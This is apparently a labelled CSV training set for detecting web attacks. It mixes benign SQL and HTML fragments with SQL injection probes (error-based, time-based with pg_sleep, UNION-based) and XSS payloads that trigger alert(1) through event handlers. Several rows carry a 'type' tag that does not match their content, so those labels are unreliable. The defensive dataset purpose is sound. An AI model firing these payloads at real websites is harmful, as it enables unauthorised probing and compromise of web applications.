Text,Label,type
"  (  extractvalue  (  1759,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1759  =  1759,1   )    )     )  ,0x717a767a71   )    )     )  ",1,sql
SELECT * FROM lack WHERE dark LIKE '%effort%',0,xss
1   )    )    and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,1,xss
innes,0,sql
"vallbona, 72 3?b",0,sql
<li>Memory,0,xss
doa,0,xss
" SELECT column_name ( s )  FROM parallel,kind",0,sql
SELECT * FROM children WHERE active = 'quiet' FETCH FIRST 3 ROWS ONLY,0,sql
"<div draggable=""true"" contenteditable>drag me</div><tbody ondragover=alert(1) contenteditable>drop here</tbody>",2,xss
<td id=x tabindex=1 onbeforeactivate=alert(1)></td>,2,xss
"	 </span>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=the+Guardian&amp;rft.atitle=Google%27s+DeepMind+makes+AI+program+that+can+learn+like+a+human&amp;rft.date=2017-03-14&amp;rft.aulast=Sample&amp;rft.aufirst=Ian&amp;rft_id=https%3A%2F%2Fwww.theguardian.com%2Fglobal%2F2017%2Fmar%2F14%2Fgoogles-deepmind-makes-ai-program-that-can-learn-like-a-human&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,xss
1'  )   where 1115  =  1115,1,sql
"<li><a href=""/wiki/Hilbert%27s_program"" title=""Hilbert&#39;s program"">Hilbert's program </a><span class=""nowrap"">&#160; ",0,xss
SELECT * FROM slow FETCH FIRST 50 PERCENT ROWS ONLY,0,xss
SELECT shelf ( s )  FROM kill,0,xss
-1127 or 7391  =  4954,1,sql
"  SELECT famousID AS ID, principle AS room FROM children",0,xss
SELECT COUNT ( DISTINCT cover )  FROM run,0,sql
<span onpointerdown=alert(1)>XSS</span>,2,xss
	 </span> </a> </li>,0,xss
"-1808%""   )    )    or 4595  =  3545 and    (    (   ""%""  =  """,1,sql
"1'+  (  select mems where 5091  =  5091 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )     )  +'",1,sql
"1'  )   where 3375  =  3375 or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1,sql
SELECT * FROM also WHERE NOT research = 'system'  AND NOT basic = 'post',0,xss
garde3@gay-tantra.kw,0,sql
ilsup,0,xss
"1'||  (  select 'fqoz' where 9794  =  9794 union all select null,null,null,null,null--",1,sql
9140,0,sql
" </div> </td> </tr><tr><th scope=""row"" class=""navbox-group"" style=""width:1%""><a href=""/wiki/Algorithm"" title=""Algorithm"">Algorithms </a> </th><td class=""navbox-list navbox-even"" style=""text-align:left;border-left-width:2px;border-left-style:solid;width:100%;padding:0px"">",0,xss
1'  )   as uaoz where 2464  =  2464,1,sql
SELECT bare FROM spell,0,sql
"<li><a href=""/wiki/Inquiry"" title=""Inquiry"">Inquiry </a> </li>",0,xss
1'||  (  select 'ptkj' from dual where 6263  =  6263 union all select null--,1,sql
"INSERT INTO repeat  ( shelf, writer, mouse )  VALUES  ( 'brought', 'art', 'next' )  ",0,sql
"portugal 87,",0,xss
SELECT * FROM pink WHERE having NOT BETWEEN 'nervous' AND 'maybe',0,sql
SELECT AVG ( stream ) FROM reader SELECT SUM ( drink ) ,0,sql
-9120'   )    )    or 8571  =  8571--,1,sql
"<style>@keyframes slidein {}</style><a style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" 									onanimationiteration=""alert(1)""></a>",2,xss
DELETE FROM push,0,sql
<ruby id=x tabindex=1 onfocus=alert(1)></ruby>,2,xss
hawker-wiese7@tradora.mg,0,sql
"<li><a href=""/wiki/DeepMind"" title=""DeepMind"">DeepMind </a> </li>",0,xss
"<sub draggable=""true"" ondragend=""alert(1)"">test</sub>",2,xss
broquel,0,sql
"<rtc onbeforepaste=""alert(1)"" contenteditable>test</rtc>",2,xss
SELECT * FROM anyone 3 SELECT * FROM base,0,xss
"<style>:target {color:red;}</style><nobr id=x style=""transition:color 1s"" ontransitionend=alert(1)></nobr>",2,xss
"-8760"" union all select 2309,2309,2309,2309,2309,2309,2309,2309,2309#",1,xss
SELECT * FROM person,0,sql
"1' and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and 'cxor'  =  'cxor",1,sql
mcguinness.clayburgh7@eldeseodepecar.gu,0,xss
-4904'  )   as ogyu where 2821  =  2821 or 5982  =  1643,1,sql
"c/ meson de jativa, 109 10-a",0,sql
3orc75r,0,sql
SELECT * FROM Customers WHERE Country = 'Mexico';,0,sql
"1'   )    )    and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (   'mwyu'  =  'mwyu",1,xss
"  SELECT seedID AS ID, facing AS claws FROM lack",0,sql
"1'   )    )     )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  'iari'  =  'iari",1,sql
"          <p class=""caption""><span class=""caption-text"">First steps",0,xss
